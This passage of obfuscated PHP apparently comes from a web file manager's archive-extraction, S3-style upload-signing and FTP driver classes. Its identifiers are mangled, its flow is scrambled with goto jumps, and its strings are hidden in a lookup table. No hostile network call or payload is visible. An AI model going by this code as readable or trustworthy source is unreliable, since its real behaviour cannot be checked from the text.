array($D»ÙÁŠÍŞ[1041] => !0, $D»ÙÁŠÍŞ[1043] => $EÒä§ô”ƒ); } else { return array($D»ÙÁŠÍŞ[1041] => !1, $D»ÙÁŠÍŞ[1043] => $EÒä§ô”ƒ); } } static function extract($a®‰–‚®àô, $aºéˆãó™é, $B¾Ë›‹³‘‹ = "\x2d\61", &$a»Ä¿˜å = false) { goto F‚¿—óí; c†¸¦¿ğÃŒ: if (self::checkIfType($a Ç”İŠâ¿, $F¾—Šò‚ğø[1910])) { if ($B¾Ë›‹³‘‹ != $F¾—Šò‚ğø[1040]) { $c¸„‹¾‡»î = unzip_pre_name($c¸„‹¾‡»î); $b¼Å›¥ÛÇå = unzip_pre_name($b¼Å›¥ÛÇå); $aµ“™Ñò£ = PclTarExtractList($a®‰–‚®àô, array($c¸„‹¾‡»î), $aºéˆãó™é, $b¼Å›¥ÛÇå, $a Ç”İŠâ¿); } else { $aµ“™Ñò£ = PclTarExtract($a®‰–‚®àô, $aºéˆãó™é, $F¾—Šò‚ğø[361], $a Ç”İŠâ¿); } return array($F¾—Šò‚ğø[1041] => $aµ“™Ñò£, $F¾—Šò‚ğø[1043] => PclErrorString(!0)); } else { if (self::checkIfType($a Ç”İŠâ¿, $F¾—Šò‚ğø[1054])) { return kodRarArchive::extract($a®‰–‚®àô, $aºéˆãó™é, $a Ç”İŠâ¿, $a»Ä¿˜å); } else { if (kodZipArchive::support($F¾—Šò‚ğø[1932])) { return kodZipArchive::extract($a®‰–‚®àô, $aºéˆãó™é, $a»Ä¿˜å); } else { $B®Ã•Ë——Ï = new PclZip($a®‰–‚®àô); if ($B¾Ë›‹³‘‹ != $F¾—Šò‚ğø[1040]) { $aµ“™Ñò£ = $B®Ã•Ë——Ï->extract(PCLZIP_OPT_PATH, $aºéˆãó™é, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $F¾—Šò‚ğø[1933], PCLZIP_OPT_BY_NAME, $B–Ò¹§‡Ç[$F¾—Šò‚ğø[1928]], PCLZIP_OPT_REMOVE_PATH, $b¼Å›¥ÛÇå, PCLZIP_OPT_REPLACE_NEWER); } else { $aµ“™Ñò£ = $B®Ã•Ë——Ï->extract(PCLZIP_OPT_PATH, $aºéˆãó™é, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $F¾—Šò‚ğø[1933], PCLZIP_OPT_REPLACE_NEWER); } return array($F¾—Šò‚ğø[1041] => $aµ“™Ñò£, $F¾—Šò‚ğø[1043] => $B®Ã•Ë——Ï->errorName(!0)); } } } return array($F¾—Šò‚ğø[1041] => !1, $F¾—Šò‚ğø[1043] => $F¾—Šò‚ğø[1934]); goto d¸é±ëŠÓ; AÉâ†¾šÆÖ: $AºÅ¦éè³† = self::listContent($a®‰–‚®àô, !1); if (!$AºÅ¦éè³†[$F¾—Šò‚ğø[1041]]) { return $AºÅ¦éè³†; } if ($B¾Ë›‹³‘‹ != $F¾—Šò‚ğø[1040]) { goto FÃñ¼¶«Á; FÃñ¼¶«Á: $B–Ò¹§‡Ç = self::fileIndex($AºÅ¦éè³†[$F¾—Šò‚ğø[1043]], $B¾Ë›‹³‘‹); $a»Ä¿˜å = str_replace(array($F¾—Šò‚ğø[1081], $F¾—Šò‚ğø[1930]), $F¾—Šò‚ğø[70], $B–Ò¹§‡Ç[$F¾—Šò‚ğø[1928]]); $c¸„‹¾‡»î = $a»Ä¿˜å; goto dßÜùœøï×; dßÜùœøï×: if ($GLOBALS[$F¾—Šò‚ğø[6]][$F¾—Šò‚ğø[1161]] != $F¾—Šò‚ğø[326]) { $c¸„‹¾‡»î = unzip_pre_name($a»Ä¿˜å); } $b¼Å›¥ÛÇå = get_path_father($a»Ä¿˜å); if ($b¼Å›¥ÛÇå == $a»Ä¿˜å) { $b¼Å›¥ÛÇå = $F¾—Šò‚ğø[33]; } goto B‘š™Ì²Ç; B‘š™Ì²Ç: if ($B–Ò¹§‡Ç[$F¾—Šò‚ğø[76]]) { $c¸„‹¾‡»î = rtrim($c¸„‹¾‡»î, $F¾—Šò‚ğø[8]) . $F¾—Šò‚ğø[8]; $a»Ä¿˜å = array($a»Ä¿˜å); } $DÀì“ç‡®Ş = str_replace($F¾—Šò‚ğø[93], $F¾—Šò‚ğø[8], $c¸„‹¾‡»î); if (substr($DÀì“ç‡®Ş, -1) == $F¾—Šò‚ğø[8]) { if (!strstr(trim($DÀì“ç‡®Ş, $F¾—Šò‚ğø[8]), $F¾—Šò‚ğø[8])) { $aºéˆãó™é = $aºéˆãó™é . get_path_this($DÀì“ç‡®Ş) . $F¾—Šò‚ğø[8]; } } else { if ($b¼Å›¥ÛÇå == $c¸„‹¾‡»î) { $b¼Å›¥ÛÇå = $F¾—Šò‚ğø[33]; } } goto a—ÉŠğÃÛ•; a—ÉŠğÃÛ•: } goto c†¸¦¿ğÃŒ; F‚¿—óí: $F¾—Šò‚ğø =& $_SERVER[¯Ò¬Èè]; self::init(); $a Ç”İŠâ¿ = !empty($GLOBALS[$F¾—Šò‚ğø[1058]]) ? $GLOBALS[$F¾—Šò‚ğø[1058]] : get_path_ext($a®‰–‚®àô); goto AÉâ†¾šÆÖ; d¸é±ëŠÓ: } static function fileIndex($e…Šâ’†„Ì, $e…•Ğ™Ô«Ã, $DÅ±áç«©Û = false) { goto BË÷‘‰ƒÌ; BË÷‘‰ƒÌ: $C»ÊöÎã ğ =& $_SERVER[¯Ò¬Èè]; self::init(); if (!is_array($e…Šâ’†„Ì)) { return !1; } goto c¹Í†æÉì–; F²óê•¡Üò: $AÓŸÀù™ÉŞ = $Dæ×ì¹‰îŸ; if ($DÅ±áç«©Û) { $AÓŸÀù™ÉŞ = $Dæ×ì¹‰îŸ[$DÅ±áç«©Û]; if ($Dæ×ì¹‰îŸ[$C»ÊöÎã ğ[76]]) { $AÓŸÀù™ÉŞ = rtrim($AÓŸÀù™ÉŞ, $C»ÊöÎã ğ[8]) . $C»ÊöÎã ğ[8]; } } return $AÓŸÀù™ÉŞ; goto dË£Œ†È§; c¹Í†æÉì–: $dÌ×­ËˆÛÖ = count($e…Šâ’†„Ì); for ($d¼†¶×Ù“É = 0; $d¼†¶×Ù“É < $dÌ×­ËˆÛÖ; $d¼†¶×Ù“É++) { if ($e…•Ğ™Ô«Ã == $e…Šâ’†„Ì[$d¼†¶×Ù“É][$C»ÊöÎã ğ[1045]]) { $Dæ×ì¹‰îŸ = $e…Šâ’†„Ì[$d¼†¶×Ù“É]; break; } } if (!$Dæ×ì¹‰îŸ) { show_tips($C»ÊöÎã ğ[1935]); } goto F²óê•¡Üò; dË£Œ†È§: } static function extractZipFile($cÂÀµ¥Šó¡, $AŸáß†‹¢, $aâ¤…°âÓô = false) { goto EôÙ‡‰Ì; böš¢‰¯Ü: mk_dir($Bœ‚Ï‰çïÕ); $föÌ‡îøˆ¶ = $Bœ‚Ï‰çïÕ . md5($cÂÀµ¥Šó¡ . $AŸáß†‹¢); if ($aâ¤…°âÓô) { $föÌ‡îøˆ¶ = $Bœ‚Ï‰çïÕ . $aâ¤…°âÓô; } goto EÖÃ‡Œº¿; Cº´‹“í“: if (!file_exists($aİÙ¾•‹… )) { return !1; } @rename($aİÙ¾•‹… , $föÌ‡îøˆ¶); return $föÌ‡îøˆ¶; goto BÉà‰¶îˆó; déŒè¤ùÆÓ: $Cƒñ…«²¨İ = get_path_father($AŸáß†‹¢); if ($Cƒñ…«²¨İ == $AŸáß†‹¢) { $Cƒñ…«²¨İ = $fÁªùä·„µ[33]; } $A¢êÂ«Êù¶ = $c›İÒÊëÌ³->extract(PCLZIP_OPT_PATH, $Bœ‚Ï‰çïÕ, PCLZIP_CB_PRE_FILE_NAME, $fÁªùä·„µ[1933], PCLZIP_OPT_REMOVE_PATH, $Cƒñ…«²¨İ, PCLZIP_OPT_BY_NAME, $AŸáß†‹¢); goto Cº´‹“í“; EÖÃ‡Œº¿: if (file_exists($föÌ‡îøˆ¶)) { return $föÌ‡îøˆ¶; } $c›İÒÊëÌ³ = new PclZip($cÂÀµ¥Šó¡); $aİÙ¾•‹…  = unzip_filter_ext($Bœ‚Ï‰çïÕ . get_path_this($AŸáß†‹¢)); goto déŒè¤ùÆÓ; EôÙ‡‰Ì: $fÁªùä·„µ =& $_SERVER[¯Ò¬Èè]; self::init(); $Bœ‚Ï‰çïÕ = TEMP_FILES . hash_path($cÂÀµ¥Šó¡) . $fÁªùä·„µ[8]; goto böš¢‰¯Ü; BÉà‰¶îˆó: } static function filePreview($f²óä×ğ¥, $A’å¨•æì, $cñæµ»õãÃ = false, $EÒ­ë•‚•İ = false) { goto B½ˆ»Û§í; B½ˆ»Û§í: $c©Ñâ›–Á¢ =& $_SERVER[¯Ò¬Èè]; self::init(); $a÷Ï‰ºÑ®¶ = TEMP_FILES . hash_path($f²óä×ğ¥) . $c©Ñâ›–Á¢[8]; goto d“İ“Á’Ø; a§ÇŠô­: $EäÍ¬ÏÒã‰ = unzip_pre_name($EäÍ¬ÏÒã‰); $fÊÈÊÙ´â = get_path_this($EäÍ¬ÏÒã‰); $aÛÊö´»Å¿ = unzip_filter_ext($a÷Ï‰ºÑ®¶ . $fÊÈÊÙ´â); goto FÁæÙØáâ; FÁæÙØáâ: if (!$aªµéÌö’à[$c©Ñâ›–Á¢[1041]]) { show_json($aªµéÌö’à[$c©Ñâ›–Á¢[1043]], !1); } if (!file_exists($aÛÊö´»Å¿)) { show_json($c©Ñâ›–Á¢[1937], !1); } @rename($aÛÊö´»Å¿, $D‰áŒïÄÌ); goto b†š¼Ãºêå; b†š¼Ãºêå: if (!file_exists($D‰áŒïÄÌ)) { del_dir($a÷Ï‰ºÑ®¶); show_json($c©Ñâ›–Á¢[1938]); } IO::fileOut($D‰áŒïÄÌ, $cñæµ»õãÃ, $fÊÈÊÙ´â); goto a®òù‘ºˆÖ; d“İ“Á’Ø: mk_dir($a÷Ï‰ºÑ®¶); $D‰áŒïÄÌ = $a÷Ï‰ºÑ®¶ . md5($f²óä×ğ¥ . $A’å¨•æì . $EÒ­ë•‚•İ); $EäÍ¬ÏÒã‰ = $c©Ñâ›–Á¢[33]; goto bÎÇ»æîêˆ; bÎÇ»æîêˆ: $aªµéÌö’à = self::extract($f²óä×ğ¥, $a÷Ï‰ºÑ®¶, $A’å¨•æì, $EäÍ¬ÏÒã‰); if (is_array($EäÍ¬ÏÒã‰)) { show_json($c©Ñâ›–Á¢[1936], !1); } if (file_exists($D‰áŒïÄÌ)) { IO::fileOut($D‰áŒïÄÌ, $cñæµ»õãÃ, get_path_this($EäÍ¬ÏÒã‰)); return; } goto a§ÇŠô­; a®òù‘ºˆÖ: } static function create($aÎ±ªé³ª, $F÷¡ôÏÏå‹) { $d¬¯—»½«¯ =& $_SERVER[¯Ò¬Èè]; self::init(); $AøßÉÀµÙ– = get_path_ext($aÎ±ªé³ª); $A²Ãî¢¤æ = !1; if (self::checkIfType($AøßÉÀµÙ–, $d¬¯—»½«¯[301])) { if (kodZipArchive::support($d¬¯—»½«¯[1020])) { return kodZipArchive::create($aÎ±ªé³ª, $F÷¡ôÏÏå‹); } $BÚ½Œ° = new PclZip($aÎ±ªé³ª); foreach ($F÷¡ôÏÏå‹ as $e›¡…ãáÄ => $d®íÍ¿È¯‚) { $d®íÍ¿È¯‚ = str_replace($d¬¯—»½«¯[467], $d¬¯—»½«¯[8], $d®íÍ¿È¯‚); $fÈãøÒÚÖ‘ = Kodio::clear(get_path_father($d®íÍ¿È¯‚)); if ($e›¡…ãáÄ == 0) { $A²Ãî¢¤æ = $BÚ½Œ°->create($d®íÍ¿È¯‚, PCLZIP_OPT_REMOVE_PATH, $fÈãøÒÚÖ‘, PCLZIP_CB_PRE_FILE_NAME, $d¬¯—»½«¯[1939]); continue; } $A²Ãî¢¤æ = $BÚ½Œ°->add($d®íÍ¿È¯‚, PCLZIP_OPT_REMOVE_PATH, $fÈãøÒÚÖ‘, PCLZIP_CB_PRE_FILE_NAME, $d¬¯—»½«¯[1939]); } } else { if (self::checkIfType($AøßÉÀµÙ–, $d¬¯—»½«¯[1910])) { foreach ($F÷¡ôÏÏå‹ as $e›¡…ãáÄ => $d®íÍ¿È¯‚) { $d®íÍ¿È¯‚ = str_replace($d¬¯—»½«¯[467], $d¬¯—»½«¯[8], $d®íÍ¿È¯‚); $fÈãøÒÚÖ‘ = Kodio::clear(get_path_father($d®íÍ¿È¯‚)); if ($e›¡…ãáÄ == 0) { $A²Ãî¢¤æ = PclTarCreate($aÎ±ªé³ª, array($d®íÍ¿È¯‚), $AøßÉÀµÙ–, null, $fÈãøÒÚÖ‘); continue; } $A²Ãî¢¤æ = PclTarAddList($aÎ±ªé³ª, array($d®íÍ¿È¯‚), $d¬¯—»½«¯[33], $fÈãøÒÚÖ‘, $AøßÉÀµÙ–); } } } return $A²Ãî¢¤æ; } } goto Fóªˆ‡Ïƒ—; DÔ£Íó¿Œ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($dÏÓé†Û†) { parent::__construct($dÏÓé†Û†); $this->signatureVersion($_SERVER[¯Ò¬Èè][200]); } public function uploadFormData($fÃ÷˜àÕ†Ï, $f‘êïôÎŒÜ = 3600) { goto fØåï¦š¯ù; CÏ†õÉÖ£²: $ešÒØÀŞ½ = array($b¦ëÀ®Ÿµ†[199] => $b¦ëÀ®Ÿµ†[33], $b¦ëÀ®Ÿµ†[1154] => $b¦ëÀ®Ÿµ†[33], $b¦ëÀ®Ÿµ†[1113] => $Bì†Ç‰÷Æ, $b¦ëÀ®Ÿµ†[1117] => $fäÊ£êÉ¦‡, $b¦ëÀ®Ÿµ†[1121] => $c‘È›ñÆ²å, $b¦ëÀ®Ÿµ†[1155] => $FÓÕ™ÑÒ™ë, $b¦ëÀ®Ÿµ†[1156] => $cõÑÄÊ³µ­, $b¦ëÀ®Ÿµ†[1157] => $f¢¸µ½Æ‘¶, $b¦ëÀ®Ÿµ†[1158] => $dÆÚ½ö¡Ï“, $b¦ëÀ®Ÿµ†[1159] => $AÍ£†ÈÊ“, $b¦ëÀ®Ÿµ†[169] => $this->getHost()); return $ešÒØÀŞ½; goto D½æø¼›‰’; cĞÌôè»ß: $c‘È›ñÆ²å = base64_encode(json_encode($EÖ”¤í‘âƒ)); $b–ĞÀóé¡ = hash_hmac($b¦ëÀ®Ÿµ†[1152], $E÷ë……–„Û, $b¦ëÀ®Ÿµ†[1153] . $this->secret, !0); $b¬ÇÀ„Ñ³ = hash_hmac($b¦ëÀ®Ÿµ†[1152], $this->region, $b–ĞÀóé¡, !0); goto añçÍ‘¸ó‚; aç¯“ñèİÉ: $eö½²›­Ğ = $b¦ëÀ®Ÿµ†[59]; $f¢¸µ½Æ‘¶ = gmdate($b¦ëÀ®Ÿµ†[1143]); $E÷ë……–„Û = gmdate($b¦ëÀ®Ÿµ†[704]); goto A‹Ö¶†‹õ; añçÍ‘¸ó‚: $EÕº‚‹½½Ü = hash_hmac($b¦ëÀ®Ÿµ†[1152], $eö½²›­Ğ, $b¬ÇÀ„Ñ³, !0); $a‘†Êô¾† = hash_hmac($b¦ëÀ®Ÿµ†[1152], $C…Šˆ·Ó˜‡, $EÕº‚‹½½Ü, !0); $AÍ£†ÈÊ“ = hash_hmac($b¦ëÀ®Ÿµ†[1152], $c‘È›ñÆ²å, $a‘†Êô¾†); goto CÏ†õÉÖ£²; fØåï¦š¯ù: $b¦ëÀ®Ÿµ† =& $_SERVER[¯Ò¬Èè]; $Bì†Ç‰÷Æ = $b¦ëÀ®Ÿµ†[185]; $cõÑÄÊ³µ­ = $b¦ëÀ®Ÿµ†[1142]; goto aç¯“ñèİÉ; A‹Ö¶†‹õ: $C…Šˆ·Ó˜‡ = $b¦ëÀ®Ÿµ†[1144]; $dÆÚ½ö¡Ï“ = $f‘êïôÎŒÜ . $b¦ëÀ®Ÿµ†[33]; $fäÊ£êÉ¦‡ = $b¦ëÀ®Ÿµ†[1109]; goto E÷‰àî§„Ü; E÷‰àî§„Ü: $D±­ŠÊ‹¸Õ = array($this->accessKey, $E÷ë……–„Û, $this->region, $eö½²›­Ğ, $C…Šˆ·Ó˜‡); $FÓÕ™ÑÒ™ë = implode($b¦ëÀ®Ÿµ†[8], $D±­ŠÊ‹¸Õ); $EÖ”¤í‘âƒ = array($b¦ëÀ®Ÿµ†[1111] => gmdate($b¦ëÀ®Ÿµ†[1110], strtotime($b¦ëÀ®Ÿµ†[1145])), $b¦ëÀ®Ÿµ†[1112] => array(array($b¦ëÀ®Ÿµ†[1114] => $this->bucket), array($b¦ëÀ®Ÿµ†[1113] => $Bì†Ç‰÷Æ), array($b¦ëÀ®Ÿµ†[1115], $b¦ëÀ®Ÿµ†[1116], $b¦ëÀ®Ÿµ†[33]), array($b¦ëÀ®Ÿµ†[1115], $b¦ëÀ®Ÿµ†[1146], $b¦ëÀ®Ÿµ†[33]), array($b¦ëÀ®Ÿµ†[1115], $b¦ëÀ®Ÿµ†[1147], $b¦ëÀ®Ÿµ†[33]), array($b¦ëÀ®Ÿµ†[1117] => $fäÊ£êÉ¦‡), array($b¦ëÀ®Ÿµ†[1148] => $FÓÕ™ÑÒ™ë), array($b¦ëÀ®Ÿµ†[1149] => $cõÑÄÊ³µ­), array($b¦ëÀ®Ÿµ†[1150] => $f¢¸µ½Æ‘¶), array($b¦ëÀ®Ÿµ†[1151] => $dÆÚ½ö¡Ï“))); goto cĞÌôè»ß; D½æø¼›‰’: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($dâ‚¥Ê¯¹Á) { parent::__construct(); if (count($dâ‚¥Ê¯¹Á) > 0) { $this->_init($dâ‚¥Ê¯¹Á); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($AÔùØğÀŒö) { $F¿ê®–‘óí =& $_SERVER[¯Ò¬Èè]; global $config; $this->appCharset = $config[$F¿ê®–‘óí[1160]]; $this->systemCharset = $config[$F¿ê®–‘óí[1161]]; if (isset($AÔùØğÀŒö[$F¿ê®–‘óí[1162]]) && $AÔùØğÀŒö[$F¿ê®–‘óí[1162]]) { $this->systemCharset = $AÔùØğÀŒö[$F¿ê®–‘óí[1162]]; } } public function iconvApp($E¹Ó×ÌŸÜ) { return $this->iconvTo($E¹Ó×ÌŸÜ, $this->systemCharset, $this->appCharset); } public function iconvSystem($dˆ©ÉŞ) { return $this->iconvTo($dˆ©ÉŞ, $this->appCharset, $this->systemCharset); } public function getPathOuter($bİÊğÕ ©ô) { goto Fã‹ÅÑİ¤±; c‰Ëï’”š¡: if (substr($Fğ™ëˆ‡Â„, 0, 2) == $f¦ã»àºÆš[1163]) { $Fğ™ëˆ‡Â„ = BASIC_PATH . substr($Fğ™ëˆ‡Â„, 2); } if (substr($bİÊğÕ ©ô, 0, 2) == $f¦ã»àºÆš[1163]) { $bİÊğÕ ©ô = BASIC_PATH . substr($bİÊğÕ ©ô, 2); } $Fğ™ëˆ‡Â„ = KodIO::clear($Fğ™ëˆ‡Â„); goto C­ØÅ®‘Ó«; C­ØÅ®‘Ó«: $bİÊğÕ ©ô = KodIO::clear($bİÊğÕ ©ô); $bİÊğÕ ©ô = substr($bİÊğÕ ©ô, strlen($Fğ™ëˆ‡Â„)); if (empty($this->pathDriver)) { return $bİÊğÕ ©ô; } goto eêº†²µŸ„; eêº†²µŸ„: return $this->pathDriver . $f¦ã»àºÆš[8] . ltrim($bİÊğÕ ©ô, $f¦ã»àºÆš[8]); goto cÆóñç–; Fã‹ÅÑİ¤±: $f¦ã»àºÆš =& $_SERVER[¯Ò¬Èè]; $Fğ™ëˆ‡Â„ = $this->iconvApp($this->pathBase); $bİÊğÕ ©ô = $this->iconvApp($bİÊğÕ ©ô); goto c‰Ëï’”š¡; cÆóñç–: } private function _init($f‹›Ù–ÌÆß = array()) { $fËÀœâØ‡ =& $_SERVER[¯Ò¬Èè]; if (!function_exists($fËÀœâØ‡[1164])) { show_json(LNG($fËÀœâØ‡[1165]), !1); } $this->config = $f‹›Ù–ÌÆß; $this->charsetReset($f‹›Ù–ÌÆß); foreach ($f‹›Ù–ÌÆß as $d§ ¶ŸÖ³ => $EÂœèÌÔÜ—) { if (isset($this->{$d§ ¶ŸÖ³})) { $this->{$d§ ¶ŸÖ³} = $EÂœèÌÔÜ—; } } return $this->_login($f‹›Ù–ÌÆß); } private function _login($aØñ¹‹…) { goto AÔ—ÁŞ¯¤İ; cù…éÙ‡™…: $aêâ³÷ğˆ‰[$E¹•ôà©Ÿî] = array($BÍŠŠµÍø[1169] => $this->connect, $BÍŠŠµÍø[169] => $this->host, $BÍŠŠµÍø[168] => $this->scheme, $BÍŠŠµÍø[170] => $this->port); return $bÉæ´•éÍÁ; goto FÚ²»—ò„Ã; Cø›¿šö“Ÿ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $bØ¼Ô«Í…´ = $this->pasv == $BÍŠŠµÍø[83] ? !0 : !1; @ftp_pasv($this->connect, $bØ¼Ô«Í…´); goto cù…éÙ‡™…; AÔ—ÁŞ¯¤İ: $BÍŠŠµÍø =& $_SERVER[¯Ò¬Èè]; static $aêâ³÷ğˆ‰ = array(); $E¹•ôà©Ÿî = md5(json_encode($aØñ¹‹…)); goto E¢ƒƒİÂì‡; E¢ƒƒİÂì‡: if (isset($aêâ³÷ğˆ‰[$E¹•ôà©Ÿî])) { foreach ($aêâ³÷ğˆ‰[$E¹•ôà©Ÿî] as $Böá¤çàÌá => $F‚×‘ÂˆÑÊ) { $this->{$Böá¤çàÌá} = $F‚×‘ÂˆÑÊ; } return !0; } $F»£ÈÂíáá = parse_url(trim($this->server, $BÍŠŠµÍø[8])); $this->host = $F»£ÈÂíáá[$BÍŠŠµÍø[169]]; goto dáÙÁë×òÃ; Fµ…Î‘£œë: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $bÉæ´•éÍÁ = @ftp_login($this->connect, $this->username, $this->userpass); goto Cø›¿šö“Ÿ; dáÙÁë×òÃ: $a£æ—ˆ«“Õ = isset($F»£ÈÂíáá[$BÍŠŠµÍø[168]]) && $F»£ÈÂíáá[$BÍŠŠµÍø[168]] == $BÍŠŠµÍø[1166] ? !0 : !1; $this->scheme = $a£æ—ˆ«“Õ ? $BÍŠŠµÍø[1167] : $BÍŠŠµÍø[1168]; $this->port = isset($F»£ÈÂíáá[$BÍŠŠµÍø[170]]) ? $F»£ÈÂíáá[$BÍŠŠµÍø[170]] : 21; goto Fµ…Î‘£œë; FÚ²»—ò„Ã: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Eé¤‰İ›ÑÃ, $c¼òŸ –¡› = '', $E¡ÒÄ¥¡ŠĞ = REPEAT_RENAME) { if ($this->setContent($Eé¤‰İ›ÑÃ, $c¼òŸ –¡›)) { return $this->getPathOuter($Eé¤‰İ›ÑÃ); } return !1; } public function mkdir($bçŞ¹ËÛ™œ, $AˆÙ÷‡Å…ã = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $bçŞ¹ËÛ™œ = $this->iconvSystem($bçŞ¹ËÛ™œ); if ($this->isFolder($bçŞ¹ËÛ™œ) || @ftp_mkdir($this->connect, $bçŞ¹ËÛ™œ)) { return $this->getPathOuter($bçŞ¹ËÛ™œ); } if (!$this->mkdir($this->pathFather($bçŞ¹ËÛ™œ))) { return !1; } if ($bçŞ¹ËÛ™œ = @ftp_mkdir($this->connect, $bçŞ¹ËÛ™œ)) { return $this->getPathOuter($bçŞ¹ËÛ™œ); } return !1; } public function copyFile($DšĞ¨µÎ, $F„Œ‹§Î¸) { goto FÉø™¿öÂÕ; D—Ğƒì®˜ß: $cêöñ»”œë = $this->iconvApp($bÕİõÚ†Ô¨); $this->download($DšĞ¨µÎ, $cêöñ»”œë); $cì®Şß—è = $this->upload($F„Œ‹§Î¸, $cêöñ»”œë); goto aêº”¨ç„; aêº”¨ç„: $this->tempFileRemve($bÕİõÚ†Ô¨); return $cì®Şß—è; goto ağÓŒ³ Œø; FÉø™¿öÂÕ: if (!$this->_isconn()) { return !1; } $B¸ÖÃ­§´† = $this->pathThis($this->iconvSystem($DšĞ¨µÎ)); $bÕİõÚ†Ô¨ = $this->tempFile($B¸ÖÃ­§´†); goto D—Ğƒì®˜ß; ağÓŒ³ Œø: } public function moveFile($bùŞŒ´šò, $b”Â¬ƒ¬ ) { if (!$this->_isconn()) { return !1; } $bùŞŒ´šò = $this->iconvSystem($bùŞŒ´šò); $b”Â¬ƒ¬  = $this->iconvSystem($b”Â¬ƒ¬ ); $fì‚ØË“ñ = @ftp_rename($this->connect, $bùŞŒ´šò, $b”Â¬ƒ¬ ); return $fì‚ØË“ñ ? $this->getPathOuter($b”Â¬ƒ¬ ) : !1; } public function delFile($C„Š²­è¨Ú) { if (!$this->_isconn()) { return !1; } $C„Š²­è¨Ú = $this->iconvSystem($C„Š²­è¨Ú); return @ftp_delete($this->connect, $C„Š²­è¨Ú); } public function delFolder($B¡ã‚‹ƒÓÒ) { if (!$this->_isconn()) { return !1; } $B¡ã‚‹ƒÓÒ = $this->iconvSystem($B¡ã‚‹ƒÓÒ); $eËºÅÆ»²³ = $this->ftpList($B¡ã‚‹ƒÓÒ); if (!$eËºÅÆ»²³) { return @ftp_rmdir($this->connect, $B¡ã‚‹ƒÓÒ); } foreach ($eËºÅÆ»²³ as $DÆæ‰ÁÒÔ) { if ($this->isFolder($DÆæ‰ÁÒÔ)) { $DÆæ‰ÁÒÔ = $this->iconvApp($DÆæ‰ÁÒÔ); $this->delFolder($DÆæ‰ÁÒÔ); } else { @ftp_delete($this->connect, $DÆæ‰ÁÒÔ); } } return @ftp_rmdir($this->connect, $B¡ã‚‹ƒÓÒ); } public function rename($ağÑøµ‘÷, $D£‹¼®’ç¾) { goto FªŞã‚ÇÂ; b•İöŒ’Ì»: $BØ¸ÈÉ‘‹Ê = rtrim($CÂõêÕñÓ×, $b‘§à”ˆ¶ª[8]) . $b‘§à”ˆ¶ª[8] . $CŞïœ®»÷ù; $ešÃ²‚¡Ùé = @ftp_rename($this->connect, $ağÑøµ‘÷, $BØ¸ÈÉ‘‹Ê); $BØ¸ÈÉ‘‹Ê = $this->iconvApp($BØ¸ÈÉ‘‹Ê); goto aŒøšÑâê; FªŞã‚ÇÂ: $b‘§à”ˆ¶ª =& $_SERVER[¯Ò¬Èè]; if (!$this->_isconn()) { return !1; } $CŞïœ®»÷ù = $this->fileNameAuto($this->pathFather($ağÑøµ‘÷), $D£‹¼®’ç¾); goto F¤ÔÀÂæß¡; F¤ÔÀÂæß¡: $CŞïœ®»÷ù = $this->iconvSystem($CŞïœ®»÷ù); $ağÑøµ‘÷ = $this->iconvSystem($ağÑøµ‘÷); $CÂõêÕñÓ× = $this->pathFather($ağÑøµ‘÷); goto b•İöŒ’Ì»; aŒøšÑâê: return $ešÃ²‚¡Ùé ? $this->getPathOuter($BØ¸ÈÉ‘‹Ê) : !1; goto BìË™â»Ùö; BìË™â»Ùö: } private function folderInfo($fÕŒ…Ô›˜Í, $c¦‡¸‡…Å = false) { goto aƒ´ô—È; a¢›ë·³Çø: return $fÁÜ˜ ‘‰; goto Cò˜àÇäÓ×; aƒ´ô—È: $e¥í˜Š·µ =& $_SERVER[¯Ò¬Èè]; $CŸ½ç‹°˜® = $this->getPathOuter(rtrim($fÕŒ…Ô›˜Í, $e¥í˜Š·µ[8])); $Cñ­‹µ‘¾ = $this->pathThis($CŸ½ç‹°˜®); goto aïˆÎ‹‚Ä; aïˆÎ‹‚Ä: $eºñÒŒ„ÌÀ = $this->iconvSystem($fÕŒ…Ô›˜Í); if ($c¦‡¸‡…Å) { return array($e¥í˜Š·µ[28] => $Cñ­‹µ‘¾, $e¥í˜Š·µ[75] => $CŸ½ç‹°˜®, $e¥í˜Š·µ[29] => $e¥í˜Š·µ[76]); } $fÁÜ˜ ‘‰ = array($e¥í˜Š·µ[28] => $Cñ­‹µ‘¾, $e¥í˜Š·µ[75] => $CŸ½ç‹°˜®, $e¥í˜Š·µ[29] => $e¥í˜Š·µ[76], $e¥í˜Š·µ[187] => 0, $e¥í˜Š·µ[107] => 0, $e¥í˜Š·µ[1170] => !0, $e¥í˜Š·µ[1171] => !0); goto a¢›ë·³Çø; Cò˜àÇäÓ×: } private function fileInfo($C‹¼çºÇøì, $b½Èèä„´ = false) { goto CÏÁáÈ¬×©; a½èÛ×–…î: $eèÜ¶¨‚¬š = $this->iconvSystem($C‹¼çºÇøì); if ($b½Èèä„´) { return array($aƒ´ò³¥¬[28] => $BŒ¥‚„·Ì®, $aƒ´ò³¥¬[75] => $e•Òë»²Èæ, $aƒ´ò³¥¬[29] => $aƒ´ò³¥¬[167], $aƒ´ò³¥¬[160] => $this->ext($C‹¼çºÇøì), $aƒ´ò³¥¬[77] => $this->size($C‹¼çºÇøì)); } $Aİ”—Ê¡ä = array($aƒ´ò³¥¬[28] => $BŒ¥‚„·Ì®, $aƒ´ò³¥¬[75] => $e•Òë»²Èæ, $aƒ´ò³¥¬[29] => $aƒ´ò³¥¬[167], $aƒ´ò³¥¬[187] => 0, $aƒ´ò³¥¬[107] => @ftp_mdtm($this->connect, $eèÜ¶¨‚¬š), $aƒ´ò³¥¬[160] => $this->ext($C‹¼çºÇøì), $aƒ´ò³¥¬[77] => $this->size($C‹¼çºÇøì), $aƒ´ò³¥¬[1170] => !0, $aƒ´ò³¥¬[1171] => !0); goto bá±µ‚Ë„å; CÏÁáÈ¬×©: $aƒ´ò³¥¬ =& $_SERVER[¯Ò¬Èè]; $e•Òë»²Èæ 